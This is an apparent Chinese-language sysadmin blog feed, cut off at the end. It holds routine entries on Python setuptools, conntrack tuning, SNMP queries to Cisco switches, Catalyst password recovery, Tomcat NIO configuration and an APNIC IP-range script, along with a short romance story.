      <content type="html"><![CDATA[<p>setuptools</p><p>有时候安装python的一些软件的时候会提示你setuptools之类的东西,这是这这个东西你没有安装好.所以你没有办法安装你要装大软件.</p><p>这里不再说什么原理性的东西,仅仅是说说如何安装setuptools.</p><ol><li>wget -q <a href="http://peak.telecommunity.com/dist/ez_setup.py" target="_blank" rel="noopener">http://peak.telecommunity.com/dist/ez_setup.py</a></li></ol><p>2.python ez_setup.py         ( 这一步必然失败,是为了第三步取得url准备的.)</p><p>运行这行的时候,linux会停留在Downling <del>~</del>这类似的上面.</p><p>这是因为你的这个目录下中没有setuptools-0.6c8-py2.4.egg东西.</p><ol start="3"><li>wget <a href="http://pypi.python.org/packages/2.4/s/setuptools/setuptools-0.6c8-py2.4.egg" target="_blank" rel="noopener">http://pypi.python.org/packages/2.4/s/setuptools/setuptools-0.6c8-py2.4.egg</a></li></ol><p>注意:第三步的url是根据第二步得到的url.</p><p>这时候你再运行第二步.之后再运行安装你前面不能够安装的软件.应该就解决了setuptools方面的问题了.</p><p>关键东西:是要准备好2个东西:ez_setup.py和setuptools-0.6c8-py2.4.egg.</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ip_conntrack: table full, dropping packet</title>
      <link href="/2010/10/22/ip-conntrack-table-full-dropping-packet/"/>
      <url>/2010/10/22/ip-conntrack-table-full-dropping-packet/</url>
      <content type="html"><![CDATA[<p>Last week, I found myself with a server under low load, but it couldn’t make or receive network connections. When I ran<br>dmesg<br>, I found the following line repeating over and over:</p><p>ip_conntrack: table full, dropping packet</p><p>I’d seen this message before, but I headed over to <a href="http://kbase.redhat.com/faq/FAQ_45_11238.shtm" target="_blank" rel="noopener">Red Hat’s site</a> for more details. It turns out that the server was running iptables, but it was under a very heavy load and also handling a high volume of network connections. Generally, the ip_conntrack_max is set to the total MB of RAM installed multiplied by 16. However, this server had 4GB of RAM, but ip_conntrack_max was set to 65536:</p><p># cat /proc/sys/net/ipv4/ip_conntrack_max  65536</p><p>I logged into another server with 1GB of RAM (RHES 5, 32-bit) and another with 2GB of RAM (RHES 4, 64-bit), and both had ip_conntrack_max set to 65536. I’m not sure if this is a known Red Hat issue, or if it’s just set to a standard value out of the box.</p><p>If you want to check your server’s current tracked connections, just run the following:</p><p># cat /proc/sys/net/ipv4/netfilter/ip_conntrack_count</p><p>If you want to adjust it (as I did), just run the following as root:</p><p># echo 131072 &gt; /proc/sys/net/ipv4/ip_conntrack_max</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>老公，再抱我一分钟，好吗</title>
      <link href="/2010/10/20/honey-hug-me-for-another-minute-ok/"/>
      <url>/2010/10/20/honey-hug-me-for-another-minute-ok/</url>
      <content type="html"><![CDATA[<p>她穿着白色的睡衣站在那里，眼中满是期待的神色。他坐在电脑前，转过头望着她，心中不禁一阵荡漾。  ­ 　　从座位上站起身，他张开双臂将她拥入怀中。“都快一点了，怎么还不睡？”她将头深深埋在他的怀中，语气中多了一丝委屈：“老公，你好久都没有抱过我了。”他搂紧了她，紧得一丝空隙都没有，紧得，似乎永远都不想放开手。  ­<br>　　她是个特别的女孩儿，他一直都觉得。他们原本是彼此朋友的朋友，只是出于礼貌才会点头的那种。他曾看见她与一群姐妹们疯狂地又笑又叫，也曾看过她慧黠的眼眸灵动地转上几圈，将人整得无以复加。他想，她真的不适合做老婆。这女孩儿太疯了，她只适合做个玩伴。  ­<br>　　直到有一天，他看到喝醉的她。她就那么安静地坐在角落，独自喝着酒，独自拭着泪。那里，他和她都在听那首歌――“forever”。她是为这首歌的词流泪吗？他想。或者，会是什么呢？  ­<br>　　她喝醉了，一个人醉倒在桌子前。他扶起她，不晓得她住在哪里，她被带到了他住的地方。他将她扶上床。她紧闭着眼睛，无意识地紧抓着他的手，呢喃着“不要走”。他第一次看到她的脆弱。那一夜，他揽着她合衣而眠。  ­<br>　　她是在他怀中醒来的。他望着她，看着她睁开眼睛时如婴儿一般懵懂。片刻之后，她重拾回凶悍与戒备。“你怎么在我床上？你要做什么？”她的眼睛中威胁的意味颇为浓厚。“是你在我的床上，而且是你在抱着我。”他啜着笑说。她怀疑地看看周围再看看自己。是了，这不是她的床，而她的手正横过对方的腰环着他。  ­<br>　　她轻轻地将手慢慢抽回来，似乎以为这样子他便不会察觉。而细心的他还是看见了她脸上的一丝赧然。她的眼睛转了几圈，最后才停留在他的脸上，：“我什么都没*。”她说。不过似乎中气不足。  ­<br>　　他轻笑出声。“做我女朋友吧他看着她的眼睛，温柔地说。  ­<br>　　“这算不算求婚？”她问，手指轻颤。  ­<br>　　“还不算。不过如果你想的话，我可以考虑。”他的一只手横过她的腰。  ­<br>　　“如果你每天可以抽一分钟来抱我，那么我答应你的求婚。”她说，眼睛亮亮地，直直地望着他。  ­<br>　　“嗯……好吧，那就三个月以后结婚吧。”他说。  ­<br>　　就这样，他们在他的床上订下了婚约。　　　　　　　　　　　　　　　　　  ­<br>　　“老公，你要抽一分钟抱我！”她说。结婚以后，她总会提醒他这个承诺。他是甘之如饴的。从来没有想到，从前以为古灵精怪的她竟然也有着女人的柔媚和孩子般的娇憨。每天，他都会抽出多于一分钟几倍，几十倍甚至几百倍的时间来抱她。  ­<br>　　渐渐地，他开始忙了起来。每天下班要坐在电脑前几个小时。每一次她说“抱我一分钟”时，他总会抱歉地看着她说：“下次吧，老婆。明天一起补给你。”于是她便静默地坐在沙发的一角，抱着膝望着他；每次当他终于决定休息时，她都已经趴在沙发上疲倦地睡着了。  ­<br>　　忙碌的工作使这个“抱一分钟”的承诺淡得几乎退出了他的脑海。他有他的事业要做，“她会懂”，他这样想。每天的工作累得他盘疲力尽，永远做不完的事情就这样围着他转，让他无暇再去想其他。于是，他忘了她的生日，忘了他们一周年的结婚纪念，忘了要给她一个晚安吻，也忘了给她最想要的拥抱。­<br>她越来越沉默了，经常坐在那里看着忙碌的他发呆。她发觉他的笑容越来越少了，于是她的笑容也跟着越来越少了。生日时，她在一张卡片上写下“送给最爱的妻子，祝生日快乐――永远爱你的老公”；结婚纪念日，她伴着燃尽的蜡烛和冷透的饭菜趴在餐桌上睡去。看着他团团乱转的身影，几次她甚至有些怀疑当初的决定是不是太草率，毕竟他们都还年轻。  ­<br>　　刚刚从医院回来，她的脸色有些苍白。从来的她就是怕去医院。曾经有他的陪伴，几次拥着哭得眼睛痛红的她走进门诊室做检查。这是她一辈子的弱点啊，他是知道的。那时他总会取笑她这么大的人去医院竟然会比孩子哭得还要厉害，原因只是怕打针。这一次，徘徊在医院的门口，她都不敢走进去。克制心中的恐惧对于她来说真的是太困难的一件事。  ­<br>　　最终她还是走旱灾去了。检查的结果令她大出所料――她怀孕了。  ­<br>　　回到家，她苍白着脸几次想告诉他这个消息。而他却忙得顾不上看她一眼。已经一点了，夜深露重，他却仍然坐在电脑前。他们从未吵过架，可她却觉得现在的生活比大吵一架还要可怕――他竟连吵架的时间都没有。  ­<br>　　穿着白色的睡衣，他终于鼓足勇气打断了他的工作――“老公，抱我一分钟，好吗？”  ­<br>　　他转过头望着她，那一刻她看到他眼中的诧异而后又变得温柔。将她揽在怀中，他说：“都快一点了，怎么还不睡？”趴在他的怀里，她的泪终于流了出来，委屈地说：“老公，你已经好久都没有抱过我了。”  ­<br>　　她好爱他啊，她真的好爱他。从那个在他怀中醒来的清晨开始，她知道自己渴望这样一个温暖的怀抱。她知道匆匆订下婚约她并不后悔。贪恋着他的怀抱，她总是想如果他还愿意抱她那么就一定还爱她。然而这样温暖的怀抱她却很久都不曾拥有了。  ­<br>　　“怎么了？”他轻声问，让她坐在腿上，他不禁低头亲了她一下。  ­<br>　　“老公，”她吸吸鼻子，“每天分给我一分钟好不好？一分钟就好。”  ­<br>　　她祈求的眼神让他心中一阵酸痛。自己真的好久没有抱过她了。她是那么的易感，那么的灵动。现在的她却沉静得让她无法与曾经的她联系到一起。“老婆，我有没有说过我爱你？”他说。  ­<br>　　看着她惊讶地睁大眼睛，他知道这句话他真的晚说了很久。  ­<br>　　小手不自禁地纠紧了亿的衣领，她有些瞠目结舌。他真的说爱她了吗？呆愣了半晌，她开心地抚着肚子说：“宝宝，听到了吗？爸爸说爱妈妈了，爸爸说爱妈妈了呢！”  ­<br>　　呆住的人换成了他。好半天他才又找回了自己的声音。“宝宝？我们的宝宝？”他的声音颤抖着，有┠岩灾眯拧?nbsp; ­<br>　　“嗯！”她点头。  ­<br>　　他抱紧了她，完全沉浸在喜悦之中。  ­<br>　　“老公，每天抱我们一分钟，好不好？”她说，眼睛里浮起一层雾气。  ­<br>　　“嗯！”他保证地点头。是啊，有什么会比妻儿更让他感到幸福的呢？！  ­<br>　　紧紧地环着他的腰，她知道这一辈子她的选择没有错。她会幸福，会有爱自己的丈夫和他们全心期待的可爱的孩子。是的，她会永远幸福的。  ­<br>　　“老公，再抱我一分钟，好吗？”  ­</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>给PHP编译增加curl参数的时候提示以下错误：</title>
      <link href="/2010/10/19/to-compile-the-curl-parameter-for-php-the-following-error-is-prompted/"/>
      <url>/2010/10/19/to-compile-the-curl-parameter-for-php-the-following-error-is-prompted/</url>
      <content type="html"><![CDATA[<p>在64位操作系统下（CENTOS 5.2)</p><p>给PHP编译增加curl参数的时候提示以下错误：<br>checking for gnutls support in libcurl… no<br>checking for curl_easy_perform in -lcurl… no<br>configure: error: There is something wrong. Please check config.log for more information.</p><p>检查有没有装curl的devel<br>yum list |grep curl</p><p>全都有!<br>查了半天资料, 还是找到结果了, 只要以下包都安装了, 就可以完美通过!<br>curl-devel-7.15.5-2.el5<br>e2fsprogs-devel-1.39-15.el5<br>krb5-devel-1.6.1-25.el5<br>libidn-devel-0.6.5-1.1<br>openssl-devel-0.9.8b-10.el5</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>不分片标志位</title>
      <link href="/2010/10/14/no-marking-bits/"/>
      <url>/2010/10/14/no-marking-bits/</url>
      <content type="html"><![CDATA[<p>IP首部中有一个“不分片标志位(DF)”，路由设备收到一个大于本地MTU的包，要分片的时候，将会检查它，以决定是否分片发送。此机制常常用来做为路径MTU发现的手段。  </p><p>-M参数用于设定此标志：<br>man ping  </p><p>-M hint<br>Select Path MTU Discovery strategy. hint may be either do (prohibit fragmentation, even local one),  </p><p>want (do PMTU discovery, fragment locally when packet size is large), or dont (do not set DF flag).  </p><p>ping -s 1400 -M do 网关IP</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>社会规则3则</title>
      <link href="/2010/10/09/social-rules-3/"/>
      <url>/2010/10/09/social-rules-3/</url>
      <content type="html"><![CDATA[<p>则1：跟人决定前途     </p><p>民初名妓小凤仙，要是找个民工，扫黄就被扫走了；<br>她找蔡锷，就流芳千古；<br>要是跟孙中山，那就是国母。<br>所以不在于你干什么，而在于你跟谁干。   </p><p>准则2：时间决定性质     </p><p>赵四小姐16岁去大帅府，去1年，是奸情；<br>去3年，是偷情；<br>一去30年，那就是千古爱情。<br>很多事情不是不做，而是要看做多久。   </p><p>准则3：关键岗位要有自己人  </p><p>男 子去提亲，女方家长：请自我介绍。A说：我有1000万；B说：我有一栋豪宅，价值2000万；家长很满意。就问C，你家有什么？C答：我什么都没有，只 有一个孩子在你女儿肚子里。AB无语，走了。这个案例告诉我们一个浅显的道理，核心竞争力不是钱和房子，是在关键的岗位上，要有自己的人。</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 社会规则3则 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SNMP获取Cisco设备信息</title>
      <link href="/2010/09/29/snmp-access-to-cisco-device-information/"/>
      <url>/2010/09/29/snmp-access-to-cisco-device-information/</url>
      <content type="html"><![CDATA[<p>以下是一些通过OID获取Cisco交换机信息的范例，可以参考一下</p><p>具体的名字和OID对应，可以在这个网站查询</p><p><a href="http://tools.cisco.com/Support/SNMP/do/BrowseOID.do?objectInput=ifOperStatus&amp;translate=Translate&amp;submitValue=SUBMIT&amp;submitClicked=true" target="_blank" rel="noopener">http://tools.cisco.com/Support/SNMP/do/BrowseOID.do?objectInput=ifOperStatus&amp;translate=Translate&amp;submitValue=SUBMIT&amp;submitClicked=true</a></p><h1 id="获取端口Index"><a href="#获取端口Index" class="headerlink" title="获取端口Index"></a>获取端口Index</h1><p>snmpwalk -v 2c -c Pub_PCon9-CT 192.168.232.25 1.3.6.1.2.1.2.2.1.1</p><h1 id="获取端口列表及其描述"><a href="#获取端口列表及其描述" class="headerlink" title="获取端口列表及其描述"></a>获取端口列表及其描述</h1><p>snmpwalk -v 2c -c Pub_PCon9-CT 192.168.232.25 1.3.6.1.2.1.2.2.1.2</p><h1 id="获取端口Mac地址"><a href="#获取端口Mac地址" class="headerlink" title="获取端口Mac地址"></a>获取端口Mac地址</h1><p>snmpwalk -v 2c -c Pub_PCon9-CT 192.168.232.25 1.3.6.1.2.1.2.2.1.6</p><h1 id="获取IP地址对应的Index"><a href="#获取IP地址对应的Index" class="headerlink" title="获取IP地址对应的Index"></a>获取IP地址对应的Index</h1><p>snmpwalk -v 2c -c Pub_PCon9-CT 192.168.232.25 1.3.6.1.2.1.4.20.1.2</p><h1 id="获取端口的Up-Down情况"><a href="#获取端口的Up-Down情况" class="headerlink" title="获取端口的Up/Down情况"></a>获取端口的Up/Down情况</h1><p>snmpwalk -v 2c -c Pub_PCon9-CT 192.168.232.25 1.3.6.1.2.1.2.2.1.8</p><h1 id="获取端口入流量（Bytes）"><a href="#获取端口入流量（Bytes）" class="headerlink" title="获取端口入流量（Bytes）"></a>获取端口入流量（Bytes）</h1><p>snmpwalk -v 2c -c Pub_PCon9-CT 192.168.232.25 1.3.6.1.2.1.2.2.1.10</p><h1 id="获取端口出流量（Bytes）"><a href="#获取端口出流量（Bytes）" class="headerlink" title="获取端口出流量（Bytes）"></a>获取端口出流量（Bytes）</h1><p>snmpwalk -v 2c -c Pub_PCon9-CT 192.168.232.25 1.3.6.1.2.1.2.2.1.16</p><h1 id="获取过去5秒的CPU-load-cpu繁忙的百分比"><a href="#获取过去5秒的CPU-load-cpu繁忙的百分比" class="headerlink" title="获取过去5秒的CPU load (cpu繁忙的百分比)"></a>获取过去5秒的CPU load (cpu繁忙的百分比)</h1><p>snmpwalk -v 2c -c Pub_PCon9-CT 192.168.232.25 1.3.6.1.4.1.9.2.1.56.0</p><h1 id="获取过去1分钟的CPU-load-cpu繁忙的百分比"><a href="#获取过去1分钟的CPU-load-cpu繁忙的百分比" class="headerlink" title="获取过去1分钟的CPU load (cpu繁忙的百分比)"></a>获取过去1分钟的CPU load (cpu繁忙的百分比)</h1><p>snmpwalk -v 2c -c Pub_PCon9-CT 192.168.232.25 1.3.6.1.4.1.9.2.1.57.0</p><h1 id="获取过去5分钟的CPU-load-cpu繁忙的百分比"><a href="#获取过去5分钟的CPU-load-cpu繁忙的百分比" class="headerlink" title="获取过去5分钟的CPU load (cpu繁忙的百分比)"></a>获取过去5分钟的CPU load (cpu繁忙的百分比)</h1><p>snmpwalk -v 2c -c Pub_PCon9-CT 192.168.232.25 1.3.6.1.4.1.9.2.1.58.0</p><h1 id="获取内存当前使用情况（bytes）"><a href="#获取内存当前使用情况（bytes）" class="headerlink" title="获取内存当前使用情况（bytes）"></a>获取内存当前使用情况（bytes）</h1><p>snmpwalk -v 2c -c Pub_PCon9-CT 192.168.232.25 1.3.6.1.4.1.9.9.48.1.1.1.5</p><h1 id="获取内存当前空闲多少（bytes）"><a href="#获取内存当前空闲多少（bytes）" class="headerlink" title="获取内存当前空闲多少（bytes）"></a>获取内存当前空闲多少（bytes）</h1><p>snmpwalk -v 2c -c Pub_PCon9-CT 192.168.232.25 1.3.6.1.4.1.9.9.48.1.1.1.6</p><h1 id="获取设备序列号"><a href="#获取设备序列号" class="headerlink" title="获取设备序列号"></a>获取设备序列号</h1><p>snmpwalk -v 2c -c Pub_PCon9-CT 192.168.232.25 1.3.6.1.2.1.47.1.1.1.1.11.1</p><p>或</p><p>snmpwalk -v 2c -c Pub_PCon9-CT 192.168.232.25 1.3.6.1.4.1.9.3.6.3.0</p><h1 id="获取设备名称"><a href="#获取设备名称" class="headerlink" title="获取设备名称"></a>获取设备名称</h1><p>snmpwalk -v 2c -c Pub_PCon9-CT 192.168.232.25 1.3.6.1.2.1.1.5.0</p><h1 id="以下为获取交换机第2个端口（INTEGER-2）所连接主机的MAC地址操作例子"><a href="#以下为获取交换机第2个端口（INTEGER-2）所连接主机的MAC地址操作例子" class="headerlink" title="以下为获取交换机第2个端口（INTEGER: 2）所连接主机的MAC地址操作例子"></a>以下为获取交换机第2个端口（INTEGER: 2）所连接主机的MAC地址操作例子</h1><p>################################### 步骤 1 ##############################</p><p>snmpwalk -v 2c -c Pub_PCon9-CT 192.168.232.25 1.3.6.1.2.1.17.4.3.1 | grep -w “INTEGER: 2”</p><p>返回结果：</p><p>SNMPv2-SMI::mib-2.17.4.3.1.2.0.7.233.63.136.173 = INTEGER: 2</p><p>################################### 步骤 2 ##############################</p><h1 id="从以上步骤1的返回结果获取粗体字”0-7-233-63-136-173”-，并执行以下命令"><a href="#从以上步骤1的返回结果获取粗体字”0-7-233-63-136-173”-，并执行以下命令" class="headerlink" title="从以上步骤1的返回结果获取粗体字”0.7.233.63.136.173” ，并执行以下命令"></a>从以上步骤1的返回结果获取粗体字”0.7.233.63.136.173” ，并执行以下命令</h1><p>snmpwalk -v 2c -c Pub_PCon9-CT 192.168.232.25 1.3.6.1.2.1.17.4.3.1 | grep “0.7.233.63.136.173” | grep “mib-2.17.4.3.1.1”</p><p>返回结果：</p><p>SNMPv2-SMI::mib-2.17.4.3.1.1.0.7.233.63.136.173 = Hex-STRING: 00 07 E9 3F 88 AD </p><p>00 07 E9 3F 88 AD为交换机的第2口所连接的主机网卡地址</p><p>################################### 步骤 3 ##############################</p><p>snmpwalk -v 2c -c Pub_PCon9-CT 192.168.232.25 1.3.6.1.2.1.17.1.4.1.2 | grep -w “SNMPv2-SMI::mib-2.17.1.4.1.2.2”   这里的红色2是步骤1的 INTEGER: 2</p><p>返回结果：</p><p>SNMPv2-SMI::mib-2.17.1.4.1.2.2 = INTEGER: 2</p><p>步骤3中获取到的INTEGER: 2才是对应的IfIndex</p><p>snmpwalk -v 2c -c Pub_PCon9-CT 192.168.232.41 1.3.6.1.2.1.17.4.3.1.1</p><p>snmpwalk -v 2c -c Pub_PCon9-CT 192.168.232.41 1.3.6.1.2.1.17.4.3.1.2</p><p>snmpwalk -v 2c -c Pub_PCon9-CT 192.168.232.41 1.3.6.1.2.1.17.1.4.1.2</p><p><a href="http://www.cisco.com/en/US/tech/tk648/tk362/technologies\_tech\_note09186a00801576ff.shtml" target="_blank" rel="noopener">http://www.cisco.com/en/US/tech/tk648/tk362/technologies\_tech\_note09186a00801576ff.shtml</a></p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Catalyst 2950/2960 密码恢复方法</title>
      <link href="/2010/09/28/catalyst-2950-2960-password-recovery-method/"/>
      <url>/2010/09/28/catalyst-2950-2960-password-recovery-method/</url>
      <content type="html"><![CDATA[<p>交换机居然密码错误。<br> 在网上找了个文章。  </p><p>1.连接好console线；  </p><p>2.拔电源，按住mode键插电源，直至1x口LED灯亮两秒以上方可松开mode键，flash初始化过程中断，系统进入“switch:”提示符状态； （正常启动时候按Ctrl+Break也可达到相同效果）；  </p><p>3.执行flash_init  </p><pre><code>load_helper  dir flash: (一定要有冒号)  rename flash:config.text flash:config.old (将startup-config文件改名)  boot (继续引导)  </code></pre><p>4.系统提示是否进行初始化，选择no；  </p><p>5.执行enable  </p><pre><code>  rename flash:config.old flash:config.text （恢复startup-config文件）  copy flash:config.text system:running-config （恢复running-config文件）  conf t enable secret xxxxxx （重设密码）  end    copy run start</code></pre>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>浅析tomcat nio 配置</title>
      <link href="/2010/09/25/a-brief-analysis-of-the-tomcat-nio-configuration/"/>
      <url>/2010/09/25/a-brief-analysis-of-the-tomcat-nio-configuration/</url>
      <content type="html"><![CDATA[<p>Tomcat 6.X实现了JCP的Servlet 2.5和JSP2.1的规范，并且包括其它很多有用的功能，使它成为开发<br>和部署web应用和web服务的坚实平台。<br>       NIO （No-blocking I/O）从JDK 1.4起，NIO API作为一个基于缓冲区，并能提供非阻塞I/O操作的API<br>被引入。<br>       作为开源web服务器的java实现，tomcat几乎就是web开发者开发、测试的首选，有很多其他商业服务<br>器的开发者也会优先选择tomcat作为开发时候使用，而在部署的时候，把应用发布在商业服务器上。也有<br>许多商业应用部署在tomcat上，tomcat承载着其核心的应用。但是很多开发者很迷惑，为什么在自己的应<br>用里使用tomcat作为平台的时候，而并发用户超过一定数量，服务器就变的非常繁忙，而且很快就出现了<br>connection refuse的错误。但是很多商业应用部署在tomcat上运行却安然无恙。<br>      其中有个很大的原因就是，配置良好的tomcat都会使用APR(Apache Portable Runtime),APR是<br>Apache HTTP Server2.x的核心，它是高度可移植的本地库，它使用高性能的UXIN I/O操作，低性能的<br>java io操作，但是APR对很多Java开发者而言可能稍稍有点难度，在很多OS平台上，你可能需要重新编<br>译APR。但是从Tomcat6.0以后, Java开发者很容易就可以是用NIO的技术来提升tomcat的并发处理能力。<br>但是为什么NIO可以提升tomcat的并发处理能力呢，我们先来看一下java 传统io与 java NIO的差别。  </p><p>Java 传统的IO操作都是阻塞式的(blocking I/O), 如果有socket的编程基础，你会接触过堵塞socket和<br>非堵塞socket，堵塞socket就是在accept、read、write等IO操作的的时候，如果没有可用符合条件的资<br>源，不马上返回，一直等待直到有资源为止。而非堵塞socket则是在执行select的时候，当没有资源的时<br>候堵塞，当有符合资源的时候，返回一个信号，然后程序就可以执行accept、read、write等操作，一般来<br>说，如果使用堵塞socket，通常我们通常开一个线程accept socket，当读完这次socket请求的时候，开一<br>个单独的线程处理这个socket请求；如果使用非堵塞socket，通常是只有一个线程，一开始是select状，<br>当有信号的时候可以通过 可以通过多路复用（Multiplexing)技术传递给一个指定的线程池来处理请求，然<br>后原来的线程继续select状态。 最简单的多路复用技术可以通过java管道(Pipe)来实现。换句话说，如果<br>客户端的并发请求很大的时候，我们可以使用少于客户端并发请求的线程数来处理这些请求，而这些来不<br>及立即处理的请求会被阻塞在java管道或者队列里面，等待线程池的处理。请求 听起来很复杂，在这个架<br>构当道的java 世界里，现在已经有很多优秀的NIO的架构方便开发者使用，比如Grizzly,Apache Mina等<br>等，如果你对如何编写高性能的网络服务器有兴趣，你可以研读这些源代码。<br>      简单说一下，在web服务器上阻塞IO(BIO)与NIO一个比较重要的不同是，我们使用BIO的时候往往会<br>为每一个web请求引入多线程，每个web请求一个单独的线程，所以并发量一旦上去了，线程数就上去<br>了，CPU就忙着线程切换，所以BIO不合适高吞吐量、高可伸缩的web服务器；而NIO则是使用单线程(单<br>个CPU)或者只使用少量的多线程(多CPU)来接受Socket，而由线程池来处理堵塞在pipe或者队列里的请<br>求.这样的话，只要OS可以接受TCP的连接，web服务器就可以处理该请求。大大提高了web服务器的可<br>伸缩性。<br>    我们来看一下配置，你只需要在server.xml里把 HTTP Connector做如下更改，<br>    <connector port="8080" protocol="HTTP/1.1" connectiontimeout="20000" redirectport="8443"><br>    改为<br>    <connector port="8080" protocol="org.apache.coyote.http11.Http11NioProtocol" connectiontimeout="20000" redirectport="8443"><br>然后启动服务器，你会看到org.apache.coyote.http11.Http11NioProtocol start的信息，表示NIO已经启动。其他的配置请参考官方配置文档。<br>Enjoy it.<br>最后贴上官方文档上对tomcat的三种Connector的方式做一个简单比较，  </connector></connector></p><p><img src="file:///D:/program/tomcat6/webapps/docs/images/void.gif" alt="" title="浅析tomcat nio 配置 - suchalin - 为了更好的生活而奋斗！"></p><p>Java Blocking Connector       Java Nio Blocking Connector       APR Connector<br>Classname         Http11Protocol                  Http11NioProtocol         Http11AprProtocol<br>Tomcat Version   3.x 4.x 5.x 6.x                       6.x                     5.5.x 6.x<br>Support Polling         NO                             YES                        YES<br>Polling Size           N/A                   Unlimited - Restricted by mem        Unlimited<br>Read HTTP Request     Blocking                     Blocking                       Blocking<br>Read HTTP Body        Blocking                     Blocking                       Blocking<br>Write HTTP Response   Blocking                     Blocking                       Blocking<br>SSL Support           Java SSL                     Java SSL                       OpenSSL<br>SSL Handshake         Blocking                     Non blocking                   Blocking<br>Max Connections       maxThreads                   See polling size               See polling size</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>轻松获得网通、电信、铁通IP地址分配段的方法</title>
      <link href="/2010/09/20/easy-access-to-netcom-telecom-and-tiantong-ip-address-allocation-methods/"/>
      <url>/2010/09/20/easy-access-to-netcom-telecom-and-tiantong-ip-address-allocation-methods/</url>
      <content type="html"><![CDATA[<p>有时搞一些跨网段的工程和应用，需要尽量准确的知道电信、网通、铁通等电信运营商的IP地址段分配情况，可网上的资料不但很少，而且经常都是N个月前的过期资料……<br>APNIC是管理亚太地区IP地址分配的机构，它有着丰富准确的IP地址分配库，同时这些信息也是对外公开的！下面就让我们看看如何在Linux下获得一些电信运营商的IP地址分配情况：<br>shell&gt; wget <a href="http://ftp.apnic.net/apnic/dbase/tools/ripe-dbase-client-v3.tar.gz" target="_blank" rel="noopener">http://ftp.apnic.net/apnic/dbase/tools/ripe-dbase-client-v3.tar.gz</a><br>shell&gt; tar xzvf ripe-dbase-client-v3.tar.gz<br>shell&gt; cd whois-3.1<br>shell&gt; ./configure<br>shell&gt; make<br>完成上述编译安装工作后，我们开始获取IP地址段；<br>中国网通：<br>shell&gt; ./whois3 -h whois.apnic.net -l -i mb MAINT-CNCGROUP &gt; /var/cnc<br>中国电信：<br>shell&gt; ./whois3 -h whois.apnic.net -l -i mb MAINT-CHINANET &gt; /var/chinanet<br>中国铁通：<br>shell&gt; ./whois3 -h whois.apnic.net -l -i mb MAINT-CN-CRTC &gt; /var/crtc<br>打开获取后的文件可以看到里面的信息非常详细，甚至可以看到各个分公司的负责人、电话、电子邮件等等信息。如果想得到一份整齐干净的IP地址段文件，只要用grep和awk简单过滤就可以了：）<br>一个转自CU的自动获取脚本 ：<br>复制代码 代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh  </span><br><span class="line">#auto get the IP Table  </span><br><span class="line">#get the newest delegated-apnic-latest  </span><br><span class="line">rm delegated-apnic-latest  </span><br><span class="line">if type wget  </span><br><span class="line">then wget http://ftp.apnic.net/apnic/stats/apnic/delegated-apnic-latest  </span><br><span class="line">else fetch http://ftp.apnic.net/apnic/stats/apnic/delegated-apnic-latest  </span><br><span class="line">fi  </span><br><span class="line">grep &apos;apnic|CN|ipv4&apos; delegated-apnic-latest | cut -f 4,5 -d &apos;|&apos; | tr &apos;|&apos; &apos; &apos; | while read ip cnt  </span><br><span class="line">do  </span><br><span class="line">mask=$(bc &lt;&lt;END | tail -1  </span><br><span class="line">pow=32;  </span><br><span class="line">define log2(x) &#123;  </span><br><span class="line">if (x&lt;=1) return (pow);  </span><br><span class="line">pow--;  </span><br><span class="line">return(log2(x/2));  </span><br><span class="line">&#125;  </span><br><span class="line">log2($cnt);  </span><br><span class="line">END  </span><br><span class="line">)  </span><br><span class="line">echo $ip/$mask&apos;;&apos;&gt;&gt;cnnet  </span><br><span class="line">resultext=\`whois $ip@whois.apnic.net | grep -e ^netname -e ^descr -e ^role -e ^mnt-by | cut -f 2 -d &apos;:&apos; | sed &apos;s/ *//&apos;\`  </span><br><span class="line">if echo $resultext | grep -i -e &apos;railcom&apos; -e &apos;crtc&apos; -e &apos;railway&apos;  </span><br><span class="line">then echo $ip/$mask&apos;;&apos; &gt;&gt; crc  </span><br><span class="line">elif echo $resultext | grep -i -e &apos;cncgroup&apos; -e &apos;netcom&apos;  </span><br><span class="line">then echo $ip/$mask&apos;;&apos; &gt;&gt; cnc  </span><br><span class="line">if echo $resultext | grep -i -e &apos;chinanet&apos; -e &apos;chinatel&apos;  </span><br><span class="line">then echo $ip/$mask&apos;;&apos; &gt;&gt; telcom_acl  </span><br><span class="line">elif echo $resultext | grep -i -e &apos;unicom&apos;  </span><br><span class="line">then echo $ip/$mask&apos;;&apos; &gt;&gt; unicom  </span><br><span class="line">elif echo $resultext | grep -i -e &apos;cmnet&apos;  </span><br><span class="line">then echo $ip/$mask&apos;;&apos; &gt;&gt; cmnet  </span><br><span class="line">else  </span><br><span class="line">echo $ip/$mask&apos;;&apos; &gt;&gt; other_acl  </span><br><span class="line">fi  </span><br><span 